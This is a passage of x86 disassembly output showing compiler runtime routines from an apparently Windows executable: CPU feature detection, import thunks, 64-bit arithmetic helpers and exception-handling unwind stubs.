  407526:	89 73 04             	mov    %esi,0x4(%ebx)
  407529:	89 4b 08             	mov    %ecx,0x8(%ebx)
  40752c:	89 53 0c             	mov    %edx,0xc(%ebx)
  40752f:	75 43                	jne    0x407574
  407531:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407534:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
  407539:	3d c0 06 01 00       	cmp    $0x106c0,%eax
  40753e:	74 23                	je     0x407563
  407540:	3d 60 06 02 00       	cmp    $0x20660,%eax
  407545:	74 1c                	je     0x407563
  407547:	3d 70 06 02 00       	cmp    $0x20670,%eax
  40754c:	74 15                	je     0x407563
  40754e:	3d 50 06 03 00       	cmp    $0x30650,%eax
  407553:	74 0e                	je     0x407563
  407555:	3d 60 06 03 00       	cmp    $0x30660,%eax
  40755a:	74 07                	je     0x407563
  40755c:	3d 70 06 03 00       	cmp    $0x30670,%eax
  407561:	75 11                	jne    0x407574
  407563:	8b 3d 88 c7 40 00    	mov    0x40c788,%edi
  407569:	83 cf 01             	or     $0x1,%edi
  40756c:	89 3d 88 c7 40 00    	mov    %edi,0x40c788
  407572:	eb 06                	jmp    0x40757a
  407574:	8b 3d 88 c7 40 00    	mov    0x40c788,%edi
  40757a:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40757d:	6a 07                	push   $0x7
  40757f:	58                   	pop    %eax
  407580:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  407583:	39 45 f4             	cmp    %eax,-0xc(%ebp)
  407586:	7c 30                	jl     0x4075b8
  407588:	33 c9                	xor    %ecx,%ecx
  40758a:	53                   	push   %ebx
  40758b:	0f a2                	cpuid
  40758d:	8b f3                	mov    %ebx,%esi
  40758f:	5b                   	pop    %ebx
  407590:	90                   	nop
  407591:	8d 5d dc             	lea    -0x24(%ebp),%ebx
  407594:	89 03                	mov    %eax,(%ebx)
  407596:	89 73 04             	mov    %esi,0x4(%ebx)
  407599:	89 4b 08             	mov    %ecx,0x8(%ebx)
  40759c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40759f:	89 53 0c             	mov    %edx,0xc(%ebx)
  4075a2:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  4075a5:	f7 c3 00 02 00 00    	test   $0x200,%ebx
  4075ab:	74 0e                	je     0x4075bb
  4075ad:	83 cf 02             	or     $0x2,%edi
  4075b0:	89 3d 88 c7 40 00    	mov    %edi,0x40c788
  4075b6:	eb 03                	jmp    0x4075bb
  4075b8:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  4075bb:	a1 10 c0 40 00       	mov    0x40c010,%eax
  4075c0:	83 c8 02             	or     $0x2,%eax
  4075c3:	c7 05 84 c7 40 00 01 	movl   $0x1,0x40c784
  4075ca:	00 00 00 
  4075cd:	a3 10 c0 40 00       	mov    %eax,0x40c010
  4075d2:	f7 c1 00 00 10 00    	test   $0x100000,%ecx
  4075d8:	0f 84 93 00 00 00    	je     0x407671
  4075de:	83 c8 04             	or     $0x4,%eax
  4075e1:	c7 05 84 c7 40 00 02 	movl   $0x2,0x40c784
  4075e8:	00 00 00 
  4075eb:	a3 10 c0 40 00       	mov    %eax,0x40c010
  4075f0:	f7 c1 00 00 00 08    	test   $0x8000000,%ecx
  4075f6:	74 79                	je     0x407671
  4075f8:	f7 c1 00 00 00 10    	test   $0x10000000,%ecx
  4075fe:	74 71                	je     0x407671
  407600:	33 c9                	xor    %ecx,%ecx
  407602:	0f 01 d0             	xgetbv
  407605:	89 45 ec             	mov    %eax,-0x14(%ebp)
  407608:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40760b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40760e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407611:	6a 06                	push   $0x6
  407613:	5e                   	pop    %esi
  407614:	23 c6                	and    %esi,%eax
  407616:	3b c6                	cmp    %esi,%eax
  407618:	75 57                	jne    0x407671
  40761a:	a1 10 c0 40 00       	mov    0x40c010,%eax
  40761f:	83 c8 08             	or     $0x8,%eax
  407622:	c7 05 84 c7 40 00 03 	movl   $0x3,0x40c784
  407629:	00 00 00 
  40762c:	a3 10 c0 40 00       	mov    %eax,0x40c010
  407631:	f6 c3 20             	test   $0x20,%bl
  407634:	74 3b                	je     0x407671
  407636:	83 c8 20             	or     $0x20,%eax
  407639:	c7 05 84 c7 40 00 05 	movl   $0x5,0x40c784
  407640:	00 00 00 
  407643:	a3 10 c0 40 00       	mov    %eax,0x40c010
  407648:	b8 00 00 03 d0       	mov    $0xd0030000,%eax
  40764d:	23 d8                	and    %eax,%ebx
  40764f:	3b d8                	cmp    %eax,%ebx
  407651:	75 1e                	jne    0x407671
  407653:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407656:	ba e0 00 00 00       	mov    $0xe0,%edx
  40765b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40765e:	23 c2                	and    %edx,%eax
  407660:	3b c2                	cmp    %edx,%eax
  407662:	75 0d                	jne    0x407671
  407664:	83 0d 10 c0 40 00 40 	orl    $0x40,0x40c010
  40766b:	89 35 84 c7 40 00    	mov    %esi,0x40c784
  407671:	5f                   	pop    %edi
  407672:	5e                   	pop    %esi
  407673:	5b                   	pop    %ebx
  407674:	33 c0                	xor    %eax,%eax
  407676:	c9                   	leave
  407677:	c3                   	ret
  407678:	33 c0                	xor    %eax,%eax
  40767a:	39 05 14 c0 40 00    	cmp    %eax,0x40c014
  407680:	0f 95 c0             	setne  %al
  407683:	c3                   	ret
  407684:	ff 25 1c 91 40 00    	jmp    *0x40911c
  40768a:	ff 25 28 91 40 00    	jmp    *0x409128
  407690:	ff 25 2c 91 40 00    	jmp    *0x40912c
  407696:	ff 25 30 91 40 00    	jmp    *0x409130
  40769c:	ff 25 40 91 40 00    	jmp    *0x409140
  4076a2:	ff 25 38 91 40 00    	jmp    *0x409138
  4076a8:	ff 25 34 91 40 00    	jmp    *0x409134
  4076ae:	ff 25 84 91 40 00    	jmp    *0x409184
  4076b4:	ff 25 64 91 40 00    	jmp    *0x409164
  4076ba:	ff 25 60 91 40 00    	jmp    *0x409160
  4076c0:	ff 25 5c 91 40 00    	jmp    *0x40915c
  4076c6:	ff 25 98 91 40 00    	jmp    *0x409198
  4076cc:	ff 25 b0 91 40 00    	jmp    *0x4091b0
  4076d2:	ff 25 78 91 40 00    	jmp    *0x409178
  4076d8:	ff 25 cc 91 40 00    	jmp    *0x4091cc
  4076de:	ff 25 c8 91 40 00    	jmp    *0x4091c8
  4076e4:	ff 25 c4 91 40 00    	jmp    *0x4091c4
  4076ea:	ff 25 c0 91 40 00    	jmp    *0x4091c0
  4076f0:	ff 25 bc 91 40 00    	jmp    *0x4091bc
  4076f6:	ff 25 b8 91 40 00    	jmp    *0x4091b8
  4076fc:	ff 25 b4 91 40 00    	jmp    *0x4091b4
  407702:	ff 25 e0 91 40 00    	jmp    *0x4091e0
  407708:	ff 25 ac 91 40 00    	jmp    *0x4091ac
  40770e:	ff 25 a8 91 40 00    	jmp    *0x4091a8
  407714:	ff 25 a4 91 40 00    	jmp    *0x4091a4
  40771a:	ff 25 a0 91 40 00    	jmp    *0x4091a0
  407720:	ff 25 9c 91 40 00    	jmp    *0x40919c
  407726:	ff 25 70 91 40 00    	jmp    *0x409170
  40772c:	ff 25 58 91 40 00    	jmp    *0x409158
  407732:	ff 25 dc 91 40 00    	jmp    *0x4091dc
  407738:	ff 25 94 91 40 00    	jmp    *0x409194
  40773e:	ff 25 90 91 40 00    	jmp    *0x409190
  407744:	ff 25 8c 91 40 00    	jmp    *0x40918c
  40774a:	ff 25 88 91 40 00    	jmp    *0x409188
  407750:	55                   	push   %ebp
  407751:	8b ec                	mov    %esp,%ebp
  407753:	51                   	push   %ecx
  407754:	83 3d 84 c7 40 00 01 	cmpl   $0x1,0x40c784
  40775b:	7c 66                	jl     0x4077c3
  40775d:	81 7d 08 b4 02 00 c0 	cmpl   $0xc00002b4,0x8(%ebp)
  407764:	74 09                	je     0x40776f
  407766:	81 7d 08 b5 02 00 c0 	cmpl   $0xc00002b5,0x8(%ebp)
  40776d:	75 54                	jne    0x4077c3
  40776f:	0f ae 5d fc          	stmxcsr -0x4(%ebp)
  407773:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407776:	83 f0 3f             	xor    $0x3f,%eax
  407779:	a8 81                	test   $0x81,%al
  40777b:	74 3f                	je     0x4077bc
  40777d:	a9 04 02 00 00       	test   $0x204,%eax
  407782:	75 07                	jne    0x40778b
  407784:	b8 8e 00 00 c0       	mov    $0xc000008e,%eax
  407789:	c9                   	leave
  40778a:	c3                   	ret
  40778b:	a9 02 01 00 00       	test   $0x102,%eax
  407790:	74 2a                	je     0x4077bc
  407792:	a9 08 04 00 00       	test   $0x408,%eax
  407797:	75 07                	jne    0x4077a0
  407799:	b8 91 00 00 c0       	mov    $0xc0000091,%eax
  40779e:	c9                   	leave
  40779f:	c3                   	ret
  4077a0:	a9 10 08 00 00       	test   $0x810,%eax
  4077a5:	75 07                	jne    0x4077ae
  4077a7:	b8 93 00 00 c0       	mov    $0xc0000093,%eax
  4077ac:	c9                   	leave
  4077ad:	c3                   	ret
  4077ae:	a9 20 10 00 00       	test   $0x1020,%eax
  4077b3:	75 0e                	jne    0x4077c3
  4077b5:	b8 8f 00 00 c0       	mov    $0xc000008f,%eax
  4077ba:	c9                   	leave
  4077bb:	c3                   	ret
  4077bc:	b8 90 00 00 c0       	mov    $0xc0000090,%eax
  4077c1:	c9                   	leave
  4077c2:	c3                   	ret
  4077c3:	8b 45 08             	mov    0x8(%ebp),%eax
  4077c6:	c9                   	leave
  4077c7:	c3                   	ret
  4077c8:	cc                   	int3
  4077c9:	cc                   	int3
  4077ca:	cc                   	int3
  4077cb:	cc                   	int3
  4077cc:	cc                   	int3
  4077cd:	cc                   	int3
  4077ce:	cc                   	int3
  4077cf:	cc                   	int3
  4077d0:	57                   	push   %edi
  4077d1:	56                   	push   %esi
  4077d2:	53                   	push   %ebx
  4077d3:	33 ff                	xor    %edi,%edi
  4077d5:	8b 44 24 14          	mov    0x14(%esp),%eax
  4077d9:	0b c0                	or     %eax,%eax
  4077db:	7d 14                	jge    0x4077f1
  4077dd:	47                   	inc    %edi
  4077de:	8b 54 24 10          	mov    0x10(%esp),%edx
  4077e2:	f7 d8                	neg    %eax
  4077e4:	f7 da                	neg    %edx
  4077e6:	83 d8 00             	sbb    $0x0,%eax
  4077e9:	89 44 24 14          	mov    %eax,0x14(%esp)
  4077ed:	89 54 24 10          	mov    %edx,0x10(%esp)
  4077f1:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4077f5:	0b c0                	or     %eax,%eax
  4077f7:	7d 14                	jge    0x40780d
  4077f9:	47                   	inc    %edi
  4077fa:	8b 54 24 18          	mov    0x18(%esp),%edx
  4077fe:	f7 d8                	neg    %eax
  407800:	f7 da                	neg    %edx
  407802:	83 d8 00             	sbb    $0x0,%eax
  407805:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  407809:	89 54 24 18          	mov    %edx,0x18(%esp)
  40780d:	0b c0                	or     %eax,%eax
  40780f:	75 18                	jne    0x407829
  407811:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  407815:	8b 44 24 14          	mov    0x14(%esp),%eax
  407819:	33 d2                	xor    %edx,%edx
  40781b:	f7 f1                	div    %ecx
  40781d:	8b d8                	mov    %eax,%ebx
  40781f:	8b 44 24 10          	mov    0x10(%esp),%eax
  407823:	f7 f1                	div    %ecx
  407825:	8b d3                	mov    %ebx,%edx
  407827:	eb 41                	jmp    0x40786a
  407829:	8b d8                	mov    %eax,%ebx
  40782b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40782f:	8b 54 24 14          	mov    0x14(%esp),%edx
  407833:	8b 44 24 10          	mov    0x10(%esp),%eax
  407837:	d1 eb                	shr    $1,%ebx
  407839:	d1 d9                	rcr    $1,%ecx
  40783b:	d1 ea                	shr    $1,%edx
  40783d:	d1 d8                	rcr    $1,%eax
  40783f:	0b db                	or     %ebx,%ebx
  407841:	75 f4                	jne    0x407837
  407843:	f7 f1                	div    %ecx
  407845:	8b f0                	mov    %eax,%esi
  407847:	f7 64 24 1c          	mull   0x1c(%esp)
  40784b:	8b c8                	mov    %eax,%ecx
  40784d:	8b 44 24 18          	mov    0x18(%esp),%eax
  407851:	f7 e6                	mul    %esi
  407853:	03 d1                	add    %ecx,%edx
  407855:	72 0e                	jb     0x407865
  407857:	3b 54 24 14          	cmp    0x14(%esp),%edx
  40785b:	77 08                	ja     0x407865
  40785d:	72 07                	jb     0x407866
  40785f:	3b 44 24 10          	cmp    0x10(%esp),%eax
  407863:	76 01                	jbe    0x407866
  407865:	4e                   	dec    %esi
  407866:	33 d2                	xor    %edx,%edx
  407868:	8b c6                	mov    %esi,%eax
  40786a:	4f                   	dec    %edi
  40786b:	75 07                	jne    0x407874
  40786d:	f7 da                	neg    %edx
  40786f:	f7 d8                	neg    %eax
  407871:	83 da 00             	sbb    $0x0,%edx
  407874:	5b                   	pop    %ebx
  407875:	5e                   	pop    %esi
  407876:	5f                   	pop    %edi
  407877:	c2 10 00             	ret    $0x10
  40787a:	cc                   	int3
  40787b:	cc                   	int3
  40787c:	cc                   	int3
  40787d:	cc                   	int3
  40787e:	cc                   	int3
  40787f:	cc                   	int3
  407880:	8b 44 24 08          	mov    0x8(%esp),%eax
  407884:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  407888:	0b c8                	or     %eax,%ecx
  40788a:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40788e:	75 09                	jne    0x407899
  407890:	8b 44 24 04          	mov    0x4(%esp),%eax
  407894:	f7 e1                	mul    %ecx
  407896:	c2 10 00             	ret    $0x10
  407899:	53                   	push   %ebx
  40789a:	f7 e1                	mul    %ecx
  40789c:	8b d8                	mov    %eax,%ebx
  40789e:	8b 44 24 08          	mov    0x8(%esp),%eax
  4078a2:	f7 64 24 14          	mull   0x14(%esp)
  4078a6:	03 d8                	add    %eax,%ebx
  4078a8:	8b 44 24 08          	mov    0x8(%esp),%eax
  4078ac:	f7 e1                	mul    %ecx
  4078ae:	03 d3                	add    %ebx,%edx
  4078b0:	5b                   	pop    %ebx
  4078b1:	c2 10 00             	ret    $0x10
  4078b4:	cc                   	int3
  4078b5:	cc                   	int3
  4078b6:	cc                   	int3
  4078b7:	cc                   	int3
  4078b8:	cc                   	int3
  4078b9:	cc                   	int3
  4078ba:	cc                   	int3
  4078bb:	cc                   	int3
  4078bc:	cc                   	int3
  4078bd:	cc                   	int3
  4078be:	cc                   	int3
  4078bf:	cc                   	int3
  4078c0:	53                   	push   %ebx
  4078c1:	57                   	push   %edi
  4078c2:	33 ff                	xor    %edi,%edi
  4078c4:	8b 44 24 10          	mov    0x10(%esp),%eax
  4078c8:	0b c0                	or     %eax,%eax
  4078ca:	7d 14                	jge    0x4078e0
  4078cc:	47                   	inc    %edi
  4078cd:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4078d1:	f7 d8                	neg    %eax
  4078d3:	f7 da                	neg    %edx
  4078d5:	83 d8 00             	sbb    $0x0,%eax
  4078d8:	89 44 24 10          	mov    %eax,0x10(%esp)
  4078dc:	89 54 24 0c          	mov    %edx,0xc(%esp)
  4078e0:	8b 44 24 18          	mov    0x18(%esp),%eax
  4078e4:	0b c0                	or     %eax,%eax
  4078e6:	7d 13                	jge    0x4078fb
  4078e8:	8b 54 24 14          	mov    0x14(%esp),%edx
  4078ec:	f7 d8                	neg    %eax
  4078ee:	f7 da                	neg    %edx
  4078f0:	83 d8 00             	sbb    $0x0,%eax
  4078f3:	89 44 24 18          	mov    %eax,0x18(%esp)
  4078f7:	89 54 24 14          	mov    %edx,0x14(%esp)
  4078fb:	0b c0                	or     %eax,%eax
  4078fd:	75 1b                	jne    0x40791a
  4078ff:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  407903:	8b 44 24 10          	mov    0x10(%esp),%eax
  407907:	33 d2                	xor    %edx,%edx
  407909:	f7 f1                	div    %ecx
  40790b:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40790f:	f7 f1                	div    %ecx
  407911:	8b c2                	mov    %edx,%eax
  407913:	33 d2                	xor    %edx,%edx
  407915:	4f                   	dec    %edi
  407916:	79 4e                	jns    0x407966
  407918:	eb 53                	jmp    0x40796d
  40791a:	8b d8                	mov    %eax,%ebx
  40791c:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  407920:	8b 54 24 10          	mov    0x10(%esp),%edx
  407924:	8b 44 24 0c          	mov    0xc(%esp),%eax
  407928:	d1 eb                	shr    $1,%ebx
  40792a:	d1 d9                	rcr    $1,%ecx
  40792c:	d1 ea                	shr    $1,%edx
  40792e:	d1 d8                	rcr    $1,%eax
  407930:	0b db                	or     %ebx,%ebx
  407932:	75 f4                	jne    0x407928
  407934:	f7 f1                	div    %ecx
  407936:	8b c8                	mov    %eax,%ecx
  407938:	f7 64 24 18          	mull   0x18(%esp)
  40793c:	91                   	xchg   %eax,%ecx
  40793d:	f7 64 24 14          	mull   0x14(%esp)
  407941:	03 d1                	add    %ecx,%edx
  407943:	72 0e                	jb     0x407953
  407945:	3b 54 24 10          	cmp    0x10(%esp),%edx
  407949:	77 08                	ja     0x407953
  40794b:	72 0e                	jb     0x40795b
  40794d:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  407951:	76 08                	jbe    0x40795b
  407953:	2b 44 24 14          	sub    0x14(%esp),%eax
  407957:	1b 54 24 18          	sbb    0x18(%esp),%edx
  40795b:	2b 44 24 0c          	sub    0xc(%esp),%eax
  40795f:	1b 54 24 10          	sbb    0x10(%esp),%edx
  407963:	4f                   	dec    %edi
  407964:	79 07                	jns    0x40796d
  407966:	f7 da                	neg    %edx
  407968:	f7 d8                	neg    %eax
  40796a:	83 da 00             	sbb    $0x0,%edx
  40796d:	5f                   	pop    %edi
  40796e:	5b                   	pop    %ebx
  40796f:	c2 10 00             	ret    $0x10
  407972:	cc                   	int3
  407973:	cc                   	int3
  407974:	cc                   	int3
  407975:	cc                   	int3
  407976:	cc                   	int3
  407977:	cc                   	int3
  407978:	cc                   	int3
  407979:	cc                   	int3
  40797a:	cc                   	int3
  40797b:	cc                   	int3
  40797c:	cc                   	int3
  40797d:	cc                   	int3
  40797e:	cc                   	int3
  40797f:	cc                   	int3
  407980:	83 3d 84 c7 40 00 06 	cmpl   $0x6,0x40c784
  407987:	7c 11                	jl     0x40799a
  407989:	c5 f9 6e c1          	vmovd  %ecx,%xmm0
  40798d:	c4 e3 79 22 c2 01    	vpinsrd $0x1,%edx,%xmm0,%xmm0
  407993:	62 f1 fe 08 e6 c0    	vcvtqq2pd %xmm0,%xmm0
  407999:	c3                   	ret
  40799a:	0f 57 c9             	xorps  %xmm1,%xmm1
  40799d:	f2 0f 2a ca          	cvtsi2sd %edx,%xmm1
  4079a1:	0f 57 c0             	xorps  %xmm0,%xmm0
  4079a4:	f2 0f 2a c1          	cvtsi2sd %ecx,%xmm0
  4079a8:	c1 e9 1f             	shr    $0x1f,%ecx
  4079ab:	f2 0f 59 0d 30 96 40 	mulsd  0x409630,%xmm1
  4079b2:	00 
  4079b3:	f2 0f 58 04 cd 28 96 	addsd  0x409628(,%ecx,8),%xmm0
  4079ba:	40 00 
  4079bc:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
  4079c0:	c3                   	ret
  4079c1:	ff 25 3c 91 40 00    	jmp    *0x40913c
  4079c7:	ff 25 44 91 40 00    	jmp    *0x409144
  4079cd:	cc                   	int3
  4079ce:	cc                   	int3
  4079cf:	cc                   	int3
  4079d0:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  4079d3:	e9 58 c9 ff ff       	jmp    0x404330
  4079d8:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4079db:	e9 50 c9 ff ff       	jmp    0x404330
  4079e0:	cc                   	int3
  4079e1:	cc                   	int3
  4079e2:	cc                   	int3
  4079e3:	cc                   	int3
  4079e4:	cc                   	int3
  4079e5:	90                   	nop
  4079e6:	90                   	nop
  4079e7:	8b 54 24 08          	mov    0x8(%esp),%edx
  4079eb:	8d 42 0c             	lea    0xc(%edx),%eax
  4079ee:	8b 4a 98             	mov    -0x68(%edx),%ecx
  4079f1:	33 c8                	xor    %eax,%ecx
  4079f3:	e8 81 f0 ff ff       	call   0x406a79
  4079f8:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4079fb:	33 c8                	xor    %eax,%ecx
  4079fd:	e8 77 f0 ff ff       	call   0x406a79
  407a02:	b8 a0 a2 40 00       	mov    $0x40a2a0,%eax
  407a07:	e9 78 fc ff ff       	jmp    0x407684
  407a0c:	cc                   	int3
  407a0d:	cc                   	int3
  407a0e:	cc                   	int3
  407a0f:	cc                   	int3
  407a10:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407a13:	e9 18 c9 ff ff       	jmp    0x404330
  407a18:	cc                   	int3
  407a19:	cc                   	int3
  407a1a:	cc                   	int3
  407a1b:	cc                   	int3
  407a1c:	cc                   	int3
  407a1d:	90                   	nop
  407a1e:	90                   	nop
  407a1f:	8b 54 24 08          	mov    0x8(%esp),%edx
  407a23:	8d 42 0c             	lea    0xc(%edx),%eax
  407a26:	8b 4a dc             	mov    -0x24(%edx),%ecx
  407a29:	33 c8                	xor    %eax,%ecx
  407a2b:	e8 49 f0 ff ff       	call   0x406a79
  407a30:	b8 e4 a2 40 00       	mov    $0x40a2e4,%eax
  407a35:	e9 4a fc ff ff       	jmp    0x407684
  407a3a:	cc                   	int3
  407a3b:	cc                   	int3
  407a3c:	cc                   	int3
  407a3d:	cc                   	int3
  407a3e:	cc                   	int3
  407a3f:	cc                   	int3
  407a40:	90                   	nop
  407a41:	90                   	nop
  407a42:	8b 54 24 08          	mov    0x8(%esp),%edx
  407a46:	8d 42 0c             	lea    0xc(%edx),%eax
  407a49:	8b 4a ec             	mov    -0x14(%edx),%ecx
  407a4c:	33 c8                	xor    %eax,%ecx
  407a4e:	e8 26 f0 ff ff       	call   0x406a79
  407a53:	b8 18 a3 40 00       	mov    $0x40a318,%eax
  407a58:	e9 27 fc ff ff       	jmp    0x407684
  407a5d:	cc                   	int3
  407a5e:	cc                   	int3
  407a5f:	cc                   	int3
  407a60:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  407a63:	e9 18 9c ff ff       	jmp    0x401680
  407a68:	cc                   	int3
  407a69:	cc                   	int3
  407a6a:	cc                   	int3
  407a6b:	cc                   	int3
  407a6c:	cc                   	int3
  407a6d:	90                   	nop
  407a6e:	90                   	nop
  407a6f:	8b 54 24 08          	mov    0x8(%esp),%edx
  407a73:	8d 42 0c             	lea    0xc(%edx),%eax
  407a76:	8b 4a e8             	mov    -0x18(%edx),%ecx
  407a79:	33 c8                	xor    %eax,%ecx
  407a7b:	e8 f9 ef ff ff       	call   0x406a79
  407a80:	8b 4a fc             	mov    -0x4(%edx),%ecx
  407a83:	33 c8                	xor    %eax,%ecx
  407a85:	e8 ef ef ff ff       	call   0x406a79
  407a8a:	b8 44 a3 40 00       	mov    $0x40a344,%eax
  407a8f:	e9 f0 fb ff ff       	jmp    0x407684
  407a94:	cc                   	int3
  407a95:	cc                   	int3
  407a96:	cc                   	int3
  407a97:	cc                   	int3
  407a98:	cc                   	int3
  407a99:	cc                   	int3
  407a9a:	cc                   	int3
  407a9b:	cc                   	int3
  407a9c:	cc                   	int3
  407a9d:	cc                   	int3
  407a9e:	cc                   	int3
  407a9f:	cc                   	int3
  407aa0:	90                   	nop
  407aa1:	90                   	nop
  407aa2:	8b 54 24 08          	mov    0x8(%esp),%edx
  407aa6:	8d 42 0c             	lea    0xc(%edx),%eax
  407aa9:	8b 4a f8             	mov    -0x8(%edx),%ecx
  407aac:	33 c8                	xor    %eax,%ecx
  407aae:	e8 c6 ef ff ff       	call   0x406a79
  407ab3:	b8 80 a3 40 00       	mov    $0x40a380,%eax
  407ab8:	e9 c7 fb ff ff       	jmp    0x407684
  407abd:	cc                   	int3
  407abe:	cc                   	int3
  407abf:	cc                   	int3
  407ac0:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407ac3:	e9 c8 95 ff ff       	jmp    0x401090
  407ac8:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407acb:	83 c1 14             	add    $0x14,%ecx
  407ace:	e9 2d a5 ff ff       	jmp    0x402000
  407ad3:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407ad6:	83 c1 2c             	add    $0x2c,%ecx
  407ad9:	e9 22 a5 ff ff       	jmp    0x402000
  407ade:	cc                   	int3
  407adf:	cc                   	int3
  407ae0:	cc                   	int3
  407ae1:	cc                   	int3
  407ae2:	cc                   	int3
  407ae3:	90                   	nop
  407ae4:	90                   	nop
  407ae5:	8b 54 24 08          	mov    0x8(%esp),%edx
  407ae9:	8d 42 0c             	lea    0xc(%edx),%eax
  407aec:	8b 4a e8             	mov    -0x18(%edx),%ecx
  407aef:	33 c8                	xor    %eax,%ecx
  407af1:	e8 83 ef ff ff       	call   0x406a79
  407af6:	b8 a4 a3 40 00       	mov    $0x40a3a4,%eax
  407afb:	e9 84 fb ff ff       	jmp    0x407684
  407b00:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  407b03:	e9 88 95 ff ff       	jmp    0x401090
  407b08:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  407b0b:	83 c1 14             	add    $0x14,%ecx
  407b0e:	e9 ed a4 ff ff       	jmp    0x402000
  407b13:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  407b16:	83 c1 2c             	add    $0x2c,%ecx
  407b19:	e9 e2 a4 ff ff       	jmp    0x402000
  407b1e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407b21:	e9 da a4 ff ff       	jmp    0x402000
  407b26:	cc                   	int3
  407b27:	cc                   	int3
  407b28:	cc                   	int3
  407b29:	cc                   	int3
  407b2a:	cc                   	int3
  407b2b:	90                   	nop
  407b2c:	90                   	nop
  407b2d:	8b 54 24 08          	mov    0x8(%esp),%edx
  407b31:	8d 42 0c             	lea    0xc(%edx),%eax
  407b34:	8b 4a d0             	mov    -0x30(%edx),%ecx
  407b37:	33 c8                	xor    %eax,%ecx
  407b39:	e8 3b ef ff ff       	call   0x406a79
  407b3e:	b8 f8 a3 40 00       	mov    $0x40a3f8,%eax
  407b43:	e9 3c fb ff ff       	jmp    0x407684
  407b48:	cc                   	int3
  407b49:	cc                   	int3
  407b4a:	cc                   	int3
  407b4b:	cc                   	int3
  407b4c:	cc                   	int3
  407b4d:	cc                   	int3
  407b4e:	cc                   	int3
  407b4f:	cc                   	int3
  407b50:	8b 45 b0             	mov    -0x50(%ebp),%eax
  407b53:	83 e0 01             	and    $0x1,%eax
  407b56:	0f 84 0c 00 00 00    	je     0x407b68
  407b5c:	83 65 b0 fe          	andl   $0xfffffffe,-0x50(%ebp)
  407b60:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  407b63:	e9 c8 c7 ff ff       	jmp    0x404330
  407b68:	c3                   	ret
  407b69:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  407b6c:	e9 bf c7 ff ff       	jmp    0x404330
  407b71:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407b74:	e9 b7 c7 ff ff       	jmp    0x404330
  407b79:	cc                   	int3
  407b7a:	cc                   	int3
  407b7b:	cc                   	int3
  407b7c:	cc                   	int3
  407b7d:	cc                   	int3
  407b7e:	90                   	nop
  407b7f:	90                   	nop
  407b80:	8b 54 24 08          	mov    0x8(%esp),%edx
  407b84:	8d 42 0c             	lea    0xc(%edx),%eax
  407b87:	8b 4a b0             	mov    -0x50(%edx),%ecx
  407b8a:	33 c8                	xor    %eax,%ecx
  407b8c:	e8 e8 ee ff ff       	call   0x406a79
  407b91:	8b 4a f8             	mov    -0x8(%edx),%ecx
  407b94:	33 c8                	xor    %eax,%ecx
  407b96:	e8 de ee ff ff       	call   0x406a79
  407b9b:	b8 4c a4 40 00       	mov    $0x40a44c,%eax
  407ba0:	e9 df fa ff ff       	jmp    0x407684
  407ba5:	cc                   	int3
  407ba6:	cc                   	int3
  407ba7:	cc                   	int3
  407ba8:	cc                   	int3
  407ba9:	cc                   	int3
  407baa:	cc                   	int3
  407bab:	cc                   	int3
  407bac:	cc                   	int3
  407bad:	cc                   	int3
  407bae:	cc                   	int3
  407baf:	cc                   	int3
  407bb0:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  407bb3:	e9 78 c7 ff ff       	jmp    0x404330
  407bb8:	cc                   	int3
  407bb9:	cc                   	int3
  407bba:	cc                   	int3
  407bbb:	cc                   	int3
  407bbc:	cc                   	int3
  407bbd:	90                   	nop
  407bbe:	90                   	nop
  407bbf:	8b 54 24 08          	mov    0x8(%esp),%edx
  407bc3:	8d 42 0c             	lea    0xc(%edx),%eax
  407bc6:	8b 8a 70 ff ff ff    	mov    -0x90(%edx),%ecx
  407bcc:	33 c8                	xor    %eax,%ecx
  407bce:	e8 a6 ee ff ff       	call   0x406a79
  407bd3:	b8 90 a4 40 00       	mov    $0x40a490,%eax
  407bd8:	e9 a7 fa ff ff       	jmp    0x407684
  407bdd:	cc                   	int3
  407bde:	cc                   	int3
  407bdf:	cc                   	int3
  407be0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407be3:	e9 a8 94 ff ff       	jmp    0x401090
  407be8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407beb:	83 c1 14             	add    $0x14,%ecx
  407bee:	e9 0d a4 ff ff       	jmp    0x402000
  407bf3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407bf6:	83 c1 2c             	add    $0x2c,%ecx
  407bf9:	e9 02 a4 ff ff       	jmp    0x402000
  407bfe:	cc                   	int3
  407bff:	cc                   	int3
